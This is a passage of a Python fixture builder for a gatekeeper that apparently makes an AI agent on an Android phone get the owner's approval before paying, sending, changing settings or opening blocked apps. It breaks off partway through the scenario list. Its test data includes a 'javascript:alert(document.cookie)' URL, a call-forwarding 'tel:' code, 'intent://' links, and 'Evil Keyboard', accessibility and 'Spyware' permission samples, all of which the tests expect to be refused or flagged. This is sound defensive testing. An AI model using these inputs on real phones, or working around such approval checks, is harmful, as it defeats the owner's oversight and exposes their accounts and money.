"""Builds the gatekeeper's shared scenario fixtures: screens.json, scenarios.json and adversarial.json.

Run `python tests/fixtures/gatekeeper/build.py` after editing; the JSON files are committed. Both the Python
reference (tests/test_gatekeeper_conformance.py, tests/test_gatekeeper_adversarial.py) and the Kotlin engine
(android/app/src/test/.../GateScenarioTest.kt) run every scenario, so the two can't drift apart.

A scenario is a list of steps run against one fresh gatekeeper:
  {"call": {"method", "params"}, "screen": <name>, "reverify_screen"?: <name>, "expect": {decision, code?, kind?,
   rule?, money?}}       admit, then (if allowed) reverify right before the side effect
  {"approve": "last", "sig": "valid" | "bad", "grant"?: bool, "binding"?: "other"}   the owner's screen-lock yes
  {"deny": "last"}       {"advance_ms": n}    {"set_wall_ms": n} (the wall clock: must change nothing)
  {"reboot": {"saved": bool, "elapsed_after": n}}    {"policy": {...record}, "sig": "valid" | "bad" | "none",
   "expect_accepted": bool}    {"instruction": "send hi to Mom"}    {"stop": true}
"""

import json
from pathlib import Path

HERE = Path(__file__).parent
W, H = 1080, 2400
FULL = [0, 0, W, H]


def node(text="", desc="", id="", cls="android.widget.TextView", bounds=(0, 0, 0, 0), children=(), **flags):
    d = {"text": text, "desc": desc, "id": id, "cls": cls, "bounds": list(bounds), "children": list(children)}
    d.update(flags)
    return d


def button(text, id, bounds, desc="", cls="android.widget.Button"):
    return node(text=text, desc=desc, id=id, cls=cls, bounds=bounds, clickable=True)


def row(text, top, id="android:id/title", checked=None):
    """A Settings preference row: a clickable layout with a title (and maybe a switch)."""
    kids = [node(text=text, id=id, bounds=(48, top + 20, 800, top + 80))]
    if checked is not None:
        kids.append(node(id="android:id/switch_widget", cls="android.widget.Switch", bounds=(900, top + 20, 1040, top + 100),
                         checked=checked, clickable=False))
    return node(cls="android.widget.LinearLayout", bounds=(0, top, W, top + 120), clickable=True, children=kids,
                **({"checked": checked} if checked is not None else {}))


def app(package, children, title="", id=1, layer=1):
    return {"id": id, "type": "application", "layer": layer, "package": package, "title": title, "bounds": FULL,
            "root": node(cls="android.widget.FrameLayout", bounds=FULL, children=children)}


def screen(*windows, **extra):
    return {"windows": list(windows), **extra}


AMAZON = "com.amazon.mShop.android.shopping"
LABELS = {AMAZON: "Amazon", "com.whatsapp": "WhatsApp", "com.chase.sig.android": "Chase", "com.android.chrome": "Chrome",
          "com.android.settings": "Settings", "dev.openmob.companion": "OpenMob", "com.chess": "Chess.com",
          "com.google.android.gm": "Gmail", "com.google.android.contacts": "Contacts", "com.example.app": "Example"}


def settings(title, rows, activity="com.android.settings.SubSettings", extra_nodes=()):
    kids = [node(text=title, id="com.android.settings:id/collapsing_toolbar", bounds=(48, 150, 900, 260))]
    kids += [row(*r) if isinstance(r, tuple) else row(r, 420 + 140 * i) for i, r in enumerate(rows)]
    kids += list(extra_nodes)
    return screen(app("com.android.settings", kids, title=title), activity=activity, labels=LABELS)


SCREENS = {
    "launcher": screen(app("com.google.android.apps.nexuslauncher", [button("Amazon", "", (0, 1800, 270, 2000))]),
                       labels=LABELS, resolve={
                           "https://www.chase.com/": {"package": "com.chase.sig.android", "candidates": ["com.chase.sig.android", "com.android.chrome"]},
                           "https://example.com/": {"package": "com.android.chrome"},
                           "https://www.amazon.com/dp/B0": {"package": AMAZON},
                           "tel:5551234": {"package": "com.google.android.dialer"},
                           "tel:*21*5551234%23": {"package": "com.evil.tel"},
                           "upi://pay?pa=x@y": {"package": "com.google.android.apps.nbu.paisa.user"},
                           "intent://scan/#Intent;scheme=zxing;end": {"package": ""},
                           "market://details?id=com.chess": {"package": "com.android.vending"},
                       }),
    "amazon_product": screen(app(AMAZON, [
        node(id="nav-search-keywords", cls="android.widget.EditText", hint="Search Amazon", editable=True,
             bounds=(40, 120, 1040, 220), clickable=True),
        node(text="USB-C cable, 2 pack, braided", bounds=(40, 400, 1040, 480)),
        node(text="$12.99", bounds=(40, 500, 400, 560)),
        node(text="In stock. Free delivery tomorrow", bounds=(40, 580, 1040, 640)),
        button("Add to cart", "add-to-cart-button", (40, 1500, 1040, 1620)),
        button("Buy now", "buy-now-button", (40, 1660, 1040, 1780)),
        node(cls="androidx.recyclerview.widget.RecyclerView", bounds=(0, 1900, W, 2300), children=[
            node(text="Customers also bought", bounds=(40, 1920, 1040, 1980))]),
        node(cls="android.widget.ImageButton", bounds=(940, 2300, 1060, 2390), clickable=True),
    ]), labels=LABELS),
    "amazon_checkout": screen(app(AMAZON, [
        node(text="Review your order", bounds=(40, 150, 1040, 230)),
        node(text="Order total: $12.99", bounds=(40, 600, 1040, 680)),
        node(text="Deliver to Ann, 1 Main St", bounds=(40, 700, 1040, 760)),
        button("Place your order", "placeYourOrder", (40, 1600, 1040, 1720)),
        node(cls="android.widget.ImageView", bounds=(40, 1800, 300, 1900), clickable=True),
    ]), labels=LABELS),
    "amazon_checkout_card": screen(app(AMAZON, [
        node(text="Add a card", bounds=(40, 150, 1040, 230)),
        node(id="cc-number", cls="android.widget.EditText", hint="Card number", editable=True, focused=True,
             bounds=(40, 400, 1040, 500)),
        node(text="Total $12.99", bounds=(40, 600, 1040, 680)),
        button("Pay now", "pay-button", (40, 1600, 1040, 1720)),
    ]), labels=LABELS),
    "amazon_autofill": screen(
        app(AMAZON, [node(id="cc-number", cls="android.widget.EditText", hint="Card number", editable=True,
                          focused=True, bounds=(40, 400, 1040, 500)),
                     node(text="Total $12.99", bounds=(40, 600, 1040, 680))]),
        {"id": 7, "type": "system", "layer": 5, "package": "com.google.android.gms", "title": "Autofill",
         "bounds": [0, 1700, W, 2000], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1700, W, 2000), children=[
             button("Visa •••• 4242", "autofill_dataset", (40, 1720, 1040, 1820))])},
        autofill_service="com.google.android.gms", labels=LABELS),
    "slide_to_pay": screen(app("com.example.shop", [
        node(text="Total $49.00", bounds=(40, 600, 1040, 680)),
        node(desc="Slide to pay", id="slide_pay", cls="android.widget.SeekBar", bounds=(40, 1600, 1040, 1720),
             clickable=True)]), labels=LABELS),
    "chase": screen(app("com.chase.sig.android", [button("Transfer", "transfer", (40, 1600, 1040, 1720))]),
                    labels=LABELS),
    "login_form": screen(app("com.example.app", [
        node(id="username", cls="android.widget.EditText", editable=True, bounds=(40, 400, 1040, 500)),
        node(id="password", cls="android.widget.EditText", editable=True, password=True, focused=True,
             bounds=(40, 520, 1040, 620)),
        button("Sign in", "login", (40, 700, 1040, 800))]), labels=LABELS),
    "otp_form": screen(app("com.example.app", [
        node(id="otp_code", cls="android.widget.EditText", hint="Enter the 6-digit code", editable=True,
             focused=True, bounds=(40, 400, 1040, 500))]), labels=LABELS),
    "chrome_url_js": screen(app("com.android.chrome", [
        node(text="javascript:alert(document.cookie)", id="com.android.chrome:id/url_bar",
             cls="android.widget.EditText", editable=True, focused=True, bounds=(100, 100, 1000, 200))]),
        labels=LABELS),
    "chrome_url_bank": screen(app("com.android.chrome", [
        node(text="https://www.chase.com/", id="com.android.chrome:id/url_bar", cls="android.widget.EditText",
             editable=True, focused=True, bounds=(100, 100, 1000, 200))]),
        labels=LABELS, resolve={"https://www.chase.com/": {"package": "com.chase.sig.android"}}),
    "chrome_search": screen(app("com.android.chrome", [
        node(text="usb c cable", id="com.android.chrome:id/search_box_text", cls="android.widget.EditText",
             hint="Search or type web address", editable=True, focused=True, bounds=(100, 100, 1000, 200))]),
        labels=LABELS),
    "web_checkout_enter": screen(app("com.android.chrome", [
        node(cls="android.webkit.WebView", bounds=(0, 200, W, H), children=[
            node(text="Checkout", bounds=(40, 220, 1040, 300)),
            node(text="Total $89.00", bounds=(40, 320, 1040, 380)),
            node(id="email", cls="android.widget.EditText", hint="Email", editable=True, focused=True,
                 bounds=(40, 400, 1040, 500)),
            button("Pay $89.00", "submit", (40, 1600, 1040, 1720))])]), labels=LABELS),
    "whatsapp_chat": screen(app("com.whatsapp", [
        node(text="Mom", bounds=(140, 120, 600, 200)),
        node(text="hi", id="com.whatsapp:id/entry", cls="android.widget.EditText", hint="Message", editable=True,
             focused=True, bounds=(40, 2200, 900, 2300)),
        node(desc="Send", id="com.whatsapp:id/send", cls="android.widget.ImageButton", bounds=(920, 2200, 1060, 2300),
             clickable=True)]), labels=LABELS),
    "gmail_list": screen(app("com.google.android.gm", [
        node(text="Inbox", bounds=(40, 120, 600, 200)),
        node(desc="Delete", id="com.google.android.gm:id/delete", cls="android.widget.ImageButton",
             bounds=(900, 120, 1040, 220), clickable=True),
        node(cls="android.widget.LinearLayout", bounds=(0, 300, W, 500), clickable=True, children=[
            node(text="Weekly newsletter", bounds=(40, 320, 1040, 380))])]), labels=LABELS),
    "settings_main": settings("Settings", ["Network & internet", "Connected devices", "Apps", "Notifications",
                                           "Battery", "System", "Security & privacy"],
                              activity="com.android.settings.Settings"),
    "settings_internet": settings("Internet", [("Wi-Fi", 420, "android:id/title", True), "Airplane mode", "Hotspot & tethering"]),
    "settings_security": settings("Security & privacy", ["Device unlock", "App security", "Wireless debugging"],
                                  activity="com.android.settings.Settings$SecurityDashboardActivity"),
    "settings_dev": settings("Developer options", [("Wireless debugging", 420, "android:id/title", False)],
                             activity="com.android.settings.Settings$DevelopmentSettingsDashboardActivity"),
    "settings_keyboards": settings("Manage on-screen keyboards", [("Evil Keyboard", 420, "android:id/title", False)],
                                   activity="com.android.settings.SubSettings"),
    "settings_datetime": settings("Date & time", [("Set time automatically", 420, "android:id/title", True),
                                                   "Set date", "Set time"]),
    "settings_bluetooth": settings("Connected devices", ["Pair new device", "Pixel Buds", "Connection preferences"]),
    "settings_system": settings("System", [("Some OEM switch", 420, "android:id/title", False), "Gestures"]),
    "settings_app_info_amazon": settings("App info", ["Amazon", "Force stop", "Clear storage", "Uninstall",
                                                       "Notifications"]),
    "settings_app_info_chase": settings("App info", ["Chase", "Force stop", "Uninstall"]),
    "samsung_accessibility": screen(app("com.samsung.accessibility", [
        node(text="Installed apps", bounds=(48, 150, 900, 260)),
        row("Evil service", 420, checked=False)], title="Accessibility"), labels=LABELS),
    "openmob_app": screen(app("dev.openmob.companion", [button("Approve", "approve", (540, 1600, 1040, 1720))]),
                          labels=LABELS),
    "keyguard_secure": screen({"id": 9, "type": "system", "layer": 9, "package": "com.android.systemui",
                               "title": "Keyguard", "bounds": FULL, "root": node(cls="android.widget.FrameLayout",
                               bounds=FULL, children=[button("1", "com.android.systemui:id/key1", (100, 1500, 300, 1650))])},
                              keyguard={"locked": True, "secure": True}),
    "keyguard_swipe": screen({"id": 9, "type": "system", "layer": 9, "package": "com.android.systemui",
                              "title": "Keyguard", "bounds": FULL, "root": node(cls="android.widget.FrameLayout",
                              bounds=FULL, children=[node(text="Swipe up to unlock", bounds=(0, 2000, W, 2100))])},
                             keyguard={"locked": True, "secure": False}),
    "biometric_prompt": screen(
        app(AMAZON, [button("Buy now", "buy-now-button", (40, 1660, 1040, 1780))]),
        {"id": 8, "type": "system", "layer": 8, "package": "com.android.systemui", "title": "",
         "bounds": [0, 1200, W, H], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1200, W, H), children=[
             button("Use PIN", "com.android.systemui:id/biometric_use_credential", (40, 2100, 500, 2200))])},
        labels=LABELS),
    "share_sheet": screen(
        app("com.google.android.apps.photos", [node(text="IMG_0042", bounds=(0, 200, W, 1200))]),
        {"id": 4, "type": "application", "layer": 4, "package": "com.android.intentresolver", "title": "Share",
         "bounds": [0, 1400, W, H], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1400, W, H), children=[
             button("Ann (WhatsApp)", "", (40, 1500, 300, 1700))])},
        labels=LABELS),
    "german_shop": screen(app("com.example.shop", [
        node(text="Warenkorb überprüfen und Bestellung abschicken", bounds=(40, 150, 1040, 230)),
        node(text="Gesamtsumme einschließlich Mehrwertsteuer", bounds=(40, 600, 1040, 680)),
        node(text="Lieferung morgen kostenlos zugestellt", bounds=(40, 700, 1040, 760)),
        button("Jetzt kaufen", "kaufen", (40, 1600, 1040, 1720)),
        button("Weiter einkaufen", "weiter", (40, 1800, 1040, 1920))]), labels=LABELS),
    "permission_dialog_session": screen(
        app("com.chess", [node(text="Play chess", bounds=(0, 200, W, 400))]),
        {"id": 5, "type": "application", "layer": 5, "package": "com.google.android.permissioncontroller",
         "title": "", "bounds": [0, 1200, W, 2000], "root": node(cls="android.widget.FrameLayout",
         bounds=(0, 1200, W, 2000), children=[
             node(text="Allow Chess.com to take pictures and record video?",
                  id="com.android.permissioncontroller:id/permission_message", bounds=(40, 1250, 1040, 1400)),
             button("While using the app", "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                    (40, 1500, 1040, 1600)),
             button("Don't allow", "com.android.permissioncontroller:id/permission_deny_button", (40, 1700, 1040, 1800))])},
        labels=LABELS),
    "permission_dialog_other": screen(
        app("com.chess", [node(text="Play chess", bounds=(0, 200, W, 400))]),
        {"id": 5, "type": "application", "layer": 5, "package": "com.google.android.permissioncontroller",
         "title": "", "bounds": [0, 1200, W, 2000], "root": node(cls="android.widget.FrameLayout",
         bounds=(0, 1200, W, 2000), children=[
             node(text="Allow Spyware to access your contacts?",
                  id="com.android.permissioncontroller:id/permission_message", bounds=(40, 1250, 1040, 1400)),
             button("Allow", "com.android.permissioncontroller:id/permission_allow_button", (40, 1500, 1040, 1600))])},
        labels=LABELS),
}


def call(method, **params):
    return {"method": method, "params": params}


def step(method, screen_name, expect, reverify=None, **params):
    s = {"call": call(method, **params), "screen": screen_name, "expect": expect}
    if reverify:
        s["reverify_screen"] = reverify
    return s


def allow(**kw):
    return {"decision": "allow", **kw}


def ask(kind=None, **kw):
    return {"decision": "ask", "code": "gate_needs_approval", **({"kind": kind} if kind else {}), **kw}


def refuse(code, **kw):
    return {"decision": "refuse", "code": code, **kw}


BUY = dict(x=540, y=1720)
ADD_TO_CART = dict(x=540, y=1560)
PLACE_ORDER = dict(x=540, y=1660)
SEND = dict(x=990, y=2250)


def sc(name, steps, tags=(), keep_open=False, **extra):
    """A scenario. A prompt nobody answers in the next step is dismissed ({"cancel": "last"}: it ends unanswered,
    which isn't a denial), unless `keep_open` (the scenario tests the open prompt itself)."""
    out = []
    for i, s in enumerate(steps):
        out.append(s)
        nxt = steps[i + 1] if i + 1 < len(steps) else None
        if not keep_open and s.get("expect", {}).get("decision") == "ask" and nxt is not None and not (
                {"approve", "deny", "cancel", "advance_ms"} & set(nxt)):
            out.append({"cancel": "last"})
    return {"name": name, "tags": list(tags), "steps": out, **extra}


SCENARIOS = [
    # D1: method classes
    sc("meta calls always pass", [step("device_state", "chase", allow()), step("wait_idle", "chase", allow())]),
    sc("unknown methods are refused", [step("run_shell", "launcher", refuse("gate_unknown_method"))]),
    sc("reads of a blocked app are blacked out", [step("screenshot", "chase", {"decision": "redact"}),
                                                  step("ui_elements", "chase", {"decision": "redact"}),
                                                  step("screenshot", "amazon_product", allow())]),
    # friction: everyday use never asks
    sc("add to cart, search and scrolling don't ask", [
        step("tap", "amazon_product", allow(), **ADD_TO_CART),
        step("tap", "amazon_product", allow(), x=500, y=170),
        step("swipe", "amazon_product", allow(), x1=540, y1=2200, x2=540, y2=700, duration_ms=300),
        step("key", "chrome_search", allow(), name="ENTER"),
        step("key", "amazon_product", allow(), name="BACK"),
        step("launch_app", "launcher", allow(), package=AMAZON),
        step("open_url", "launcher", allow(), url="https://example.com/"),
    ], tags=["friction"]),
    sc("everyday settings don't ask", [
        step("tap", "settings_main", allow(), x=540, y=480),
        step("tap", "settings_internet", allow(), x=540, y=480),
        step("tap", "settings_internet", allow(), x=540, y=620),
        step("tap", "settings_bluetooth", allow(), x=540, y=620),
        step("tap", "settings_system", allow(), x=540, y=620),
    ], tags=["friction", "settings"]),
    # D4: a purchase is one prompt
    sc("a purchase is one prompt: Buy now asks, Place your order is covered", [
        step("tap", "amazon_product", ask("pay", money="start"), **BUY),
        {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", allow(), **BUY),
        step("tap", "amazon_checkout", allow(rule="permit:purchase_flow"), **PLACE_ORDER),
        step("tap", "amazon_checkout", ask("pay", money="terminal"), **PLACE_ORDER),
    ], tags=["friction", "permits"]),
    sc("the purchase follow-up ends after 3 minutes", [
        step("tap", "amazon_product", ask("pay"), **BUY), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", allow(), **BUY), {"advance_ms": 181000},
        step("tap", "amazon_checkout", ask("pay"), **PLACE_ORDER)], tags=["permits"]),
    sc("the purchase follow-up ends at an app switch", [
        step("tap", "amazon_product", ask("pay"), **BUY), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", allow(), **BUY),
        step("tap", "whatsapp_chat", allow(), x=300, y=160),
        step("tap", "amazon_checkout", ask("pay"), **PLACE_ORDER)], tags=["permits"]),
    sc("a new flow-starting word always asks again", [
        step("tap", "amazon_product", ask("pay"), **BUY), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", allow(), **BUY), step("tap", "amazon_product", ask("pay"), **BUY)],
       tags=["permits"]),
    # D5: permits
    sc("a permit is one-shot", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid"},
        step("tap", "whatsapp_chat", allow(), **SEND), step("tap", "whatsapp_chat", ask("send"), **SEND)],
       tags=["permits", "friction"]),
    sc("a permit expires after 60 s on the monotonic clock", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid"},
        {"advance_ms": 61000}, step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["permits"]),
    sc("a badly signed approval mints nothing", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "bad", "expect_accepted": False},
        step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["permits"]),
    sc("an unanswered prompt expires after 2 minutes", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"advance_ms": 121000},
        step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["permits"]),
    sc("a permit dies if the target changed before the gesture", [
        step("tap", "amazon_product", ask("pay"), **BUY), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", refuse("gate_screen_changed"), reverify="amazon_checkout", **BUY)],
       tags=["toctou"]),
    sc("a non-risky tap whose target became risky is stopped", [
        step("tap", "amazon_product", refuse("gate_screen_changed"), reverify="amazon_checkout", x=540, y=1610)],
       tags=["toctou"]),
    sc("a risky action needs a quiet screen", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid"},
        step("tap", "whatsapp_chat", refuse("gate_screen_unstable"), reverify="whatsapp_chat_busy", **SEND)],
       tags=["toctou"]),
    # D6: requested one-shot
    sc("an instruction typed on the phone exempts one send", [
        {"instruction": "Send hi to Mom on WhatsApp"},
        step("tap", "whatsapp_chat", allow(rule="requested"), **SEND),
        step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["friction"]),
    sc("a requested purchase still asks", [
        {"instruction": "buy the usb c cable"}, step("tap", "amazon_product", ask("pay"), **BUY)]),
    # D20: Always allow
    sc("always allow sends in WhatsApp", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid", "grant": True},
        step("tap", "whatsapp_chat", allow(), **SEND), step("tap", "whatsapp_chat", allow(rule="grant"), **SEND),
        {"advance_ms": 7 * 86400000 + 1000}, step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["grants"]),
    sc("a grant survives a reboot with its remaining time", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid", "grant": True},
        step("tap", "whatsapp_chat", allow(), **SEND), {"advance_ms": 86400000},
        {"reboot": {"saved": True, "elapsed_after": 5000}},
        step("tap", "whatsapp_chat", allow(rule="grant"), **SEND), {"advance_ms": 6 * 86400000},
        step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["grants", "clock"]),
    sc("a grant without saved remaining time expires at reboot", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid", "grant": True},
        step("tap", "whatsapp_chat", allow(), **SEND), {"reboot": {"saved": False, "elapsed_after": 5000}},
        step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["grants", "clock"]),
    sc("setting the wall clock back extends nothing", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid", "grant": True},
        step("tap", "whatsapp_chat", allow(), **SEND), {"advance_ms": 7 * 86400000 + 1000},
        {"set_wall_ms": 1000000000000}, step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["grants", "clock"]),
    # D16 / D17 / D21: modes
    sc("ask mode asks for every changing act, not scrolls or BACK", [
        step("tap", "amazon_product", ask("step"), mode="ask", **ADD_TO_CART),
        step("swipe", "amazon_product", allow(), mode="ask", x1=540, y1=2200, x2=540, y2=700, duration_ms=300),
        step("key", "amazon_product", allow(), mode="ask", name="BACK")], tags=["modes"]),
    sc("never without a signature is auto", [
        step("tap", "amazon_product", ask("pay"), mode="never", allow_money=True, **BUY)], tags=["modes"]),
    sc("signed never runs risky actions but refuses money", [
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("tap", "whatsapp_chat", allow(), mode="never", **SEND),
        step("tap", "amazon_product", refuse("gate_denied", rule="never:money"), mode="never", **BUY),
        step("tap", "amazon_autofill", refuse("gate_denied", rule="never:autofill"), mode="never", x=540, y=1770),
        step("tap", "settings_system", refuse("gate_denied", rule="never:settings_page"), mode="never", x=540, y=480),
    ], tags=["modes"]),
    sc("signed never with allow purchases runs purchases", [
        {"policy": {"type": "never", "duration_ms": 3600000, "allow_money": True}, "sig": "valid",
         "expect_accepted": True},
        step("tap", "amazon_product", allow(), mode="never", **BUY),
        step("tap", "chase", refuse("gate_blocked_app"), mode="never", x=540, y=1660),
        step("tap", "settings_security", refuse("gate_denied_page"), mode="never", x=540, y=480)], tags=["modes"]),
    sc("never ends on the monotonic clock and is capped at 24 h", [
        {"policy": {"type": "never", "duration_ms": 30 * 86400000}, "sig": "valid", "expect_accepted": True},
        {"advance_ms": 86400000 + 1000}, step("tap", "whatsapp_chat", ask("send"), mode="never", **SEND)],
       tags=["modes", "clock"]),
    sc("a requested mode can only tighten the ceiling", [
        {"policy": {"type": "ceiling", "mode": "ask"}, "sig": "valid", "expect_accepted": True},
        step("tap", "amazon_product", ask("step"), mode="trusted", **ADD_TO_CART)], tags=["modes"]),
    sc("stop drops never at once", [
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        {"stop": True}, step("tap", "whatsapp_chat", ask("send"), mode="never", **SEND)], tags=["modes"]),
    # Settings deep links (docs/design/deep-links.md): judged like opening that page
    sc("settings deep links: everyday pages open, date & time asks, blocked apps' pages and unknown keys are refused", [
        step("open_settings", "launcher", allow(), page="display"),
        step("open_settings", "launcher", allow(), page="wifi"),
        step("open_settings", "launcher", allow(), page="app_notifications", package="com.android.chrome"),
        step("open_settings", "launcher", allow(), page="app_details", package=AMAZON),
        step("open_settings", "launcher", ask("settings", level="fingerprint"), page="date_time"),
        step("open_settings", "launcher", refuse("gate_blocked_app"), page="app_details", package="com.chase.sig.android"),
        step("open_settings", "launcher", refuse("gate_blocked_app"), page="app_notifications", package="dev.openmob.companion"),
        step("open_settings", "launcher", refuse("gate_denied_page", rule="builtin:settings_package"), page="app_details"),
        step("open_settings", "launcher", refuse("gate_denied_page", rule="builtin:settings_unknown_page"), page="accessibility"),
        step("open_settings", "launcher", refuse("gate_denied_page", rule="builtin:settings_unknown_page"),
             page="android.settings.ACCESSIBILITY_SETTINGS"),
    ], tags=["settings", "hard_deny"]),
    sc("settings deep links under Don't ask and Ask every step", [
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("open_settings", "launcher", allow(), mode="never", page="display"),
        step("open_settings", "launcher", refuse("gate_denied", rule="never:settings_page"), mode="never", page="date_time"),
        step("open_settings", "launcher", ask("step", level="tap"), mode="ask", page="display"),
    ], tags=["settings", "modes"]),
    # hard denies
    sc("blocked apps: launching, tapping and links", [
        step("launch_app", "launcher", refuse("gate_blocked_app"), package="com.chase.sig.android"),
        step("tap", "chase", refuse("gate_blocked_app"), x=540, y=1660),
        step("open_url", "launcher", refuse("gate_blocked_app"), url="https://www.chase.com/"),
        step("launch_app", "launcher", refuse("gate_blocked_app"), package="dev.openmob.companion"),
        step("launch_app", "launcher", refuse("gate_denied_page"), package="com.google.android.packageinstaller")],
       tags=["hard_deny"]),
    sc("URL schemes and resolved targets", [
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:url_scheme"), url="intent://scan/#Intent;scheme=zxing;end"),
        step("open_url", "launcher", refuse("gate_denied"), url="upi://pay?pa=x@y"),
        step("open_url", "launcher", refuse("gate_denied"), url="javascript:alert(1)"),
        step("open_url", "launcher", allow(), url="tel:5551234"),
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:tel_handler"), url="tel:*21*5551234%23"),
        step("open_url", "launcher", allow(), url="market://details?id=com.chess"),
        step("open_url", "launcher", allow(), url="https://www.amazon.com/dp/B0")], tags=["hard_deny"]),
    sc("typing: passwords, OTPs, schemes", [
        step("type_text", "login_form", refuse("gate_password_field"), text="hunter2"),
        step("type_text", "otp_form", ask("fill"), text="123456"),
        step("type_text", "amazon_product", refuse("gate_denied", rule="builtin:typed_scheme"), text="javascript:x"),
        step("type_text", "chrome_search", allow(), text="usb c cable")], tags=["hard_deny"]),
    sc("ENTER rules", [
        step("key", "whatsapp_chat", ask("send"), name="ENTER"),
        step("key", "chrome_url_js", refuse("gate_denied"), name="ENTER"),
        step("key", "chrome_url_bank", refuse("gate_blocked_app"), name="ENTER"),
        step("key", "web_checkout_enter", ask("pay"), name="ENTER")], tags=["risk"]),
    sc("Settings tiers", [
        step("tap", "settings_main", refuse("gate_denied_page"), x=540, y=1320),
        step("tap", "settings_security", refuse("gate_denied_page"), x=540, y=480),
        step("tap", "settings_dev", refuse("gate_denied_page"), x=540, y=480),
        step("tap", "settings_keyboards", refuse("gate_denied_page"), x=540, y=480),
        step("tap", "samsung_accessibility", refuse("gate_denied_page"), x=540, y=480),
        step("tap", "settings_datetime", ask("settings"), x=540, y=620),
        step("tap", "settings_bluetooth", ask("settings"), x=540, y=480),
        step("tap", "settings_system", ask("settings"), x=540, y=480)], tags=["settings"]),
    sc("app info: force stop yes, clear storage asks, a blocked app's info refused", [
        step("tap", "settings_app_info_amazon", allow(), x=540, y=620),
        step("tap", "settings_app_info_amazon", ask("delete", level="tap"), x=540, y=760),  # Clear storage
        {"cancel": "last"},
        step("tap", "settings_app_info_amazon", allow(), x=540, y=900),  # Uninstall: the installer confirms
        step("tap", "settings_app_info_chase", refuse("gate_blocked_app"), x=540, y=620)], tags=["settings"]),
    sc("permission dialogs: the task's app follows the settings, another app asks", [
        step("tap", "launcher", allow(), x=100, y=1900),
        step("tap", "permission_dialog_session", allow(), x=540, y=300),
        step("tap", "permission_dialog_session", allow(), x=540, y=1550),  # camera: the narrowest grant it offers
        step("tap", "permission_dialog_other", ask("permission", level="tap"), x=540, y=1550)], tags=["settings"]),
    sc("surfaces: OpenMob, keyguard, biometric prompt", [
        step("tap", "openmob_app", refuse("gate_denied_page", rule="builtin:own_window"), x=700, y=1650),
        step("tap", "keyguard_secure", refuse("phone_locked"), x=200, y=1570),
        step("swipe", "keyguard_swipe", refuse("gate_denied_page"), x1=540, y1=2000, x2=540, y2=600, duration_ms=250),
        step("wake_unlock", "keyguard_secure", allow()),
        step("tap", "biometric_prompt", refuse("gate_denied_page", rule="builtin:prompt_surface"), x=200, y=2150)],
       tags=["hard_deny"]),
    # risk judge
    sc("swipes and long presses are judged as taps", [
        step("swipe", "amazon_product", ask("pay"), x1=540, y1=1720, x2=560, y2=1725, duration_ms=300),
        step("swipe", "amazon_product", ask("pay"), x1=540, y1=1720, x2=540, y2=900, duration_ms=60)],
       tags=["risk"]),
    sc("a long press on Buy now asks", [step("long_press", "amazon_product", ask("pay"), duration_ms=50, **BUY)],
       tags=["risk"]),
    sc("slide to pay asks", [step("swipe", "slide_to_pay", ask("pay"), x1=60, y1=1660, x2=1000, y2=1660,
                                  duration_ms=400)], tags=["risk"]),
    sc("unlabeled taps in shopping apps ask", [
        step("tap", "amazon_product", ask("pay", rule="risk:unlabeled"), x=1000, y=2340),
        step("tap", "amazon_checkout", ask("pay"), x=170, y=1850)], tags=["risk"]),
    sc("autofill and share sheets ask", [
        step("tap", "amazon_autofill", ask("fill"), x=540, y=1770),
        step("tap", "share_sheet", ask("share"), x=170, y=1600)], tags=["risk"]),
    sc("non-English shopping screens ask", [step("tap", "german_shop", ask("other", rule="risk:language"),
                                                 x=540, y=1860)], tags=["risk"]),
    sc("a server hint only adds caution", [
        step("tap", "amazon_product", ask("other", rule="risk:server_hint"), hint="the agent thinks this pays",
             **ADD_TO_CART)], tags=["risk"]),
    sc("deleting in Gmail asks", [step("tap", "gmail_list", ask("delete"), x=970, y=170)], tags=["risk"]),
    # rate limits
    sc("prompt rate limit: 6 asks per 10 minutes", [
        *[s for _ in range(6) for s in (step("tap", "whatsapp_chat", ask("send"), **SEND), {"deny": "last"},
                                        {"resume": True}, {"advance_ms": 1000})],
        step("tap", "whatsapp_chat", refuse("gate_rate_limited", rule="builtin:prompt_rate"), **SEND),
        {"advance_ms": 600000}, step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["limits"]),
    sc("three denials suspend until the owner resumes", [
        *[s for _ in range(3) for s in (step("tap", "whatsapp_chat", ask("send"), **SEND), {"deny": "last"})],
        step("tap", "amazon_product", refuse("gate_rate_limited", rule="builtin:suspended"), **ADD_TO_CART),
        {"resume": True}, step("tap", "amazon_product", allow(), **ADD_TO_CART)], tags=["limits"]),
    sc("act rate limit: burst 15", [
        *[step("key", "amazon_product", allow(), name="BACK") for _ in range(15)],
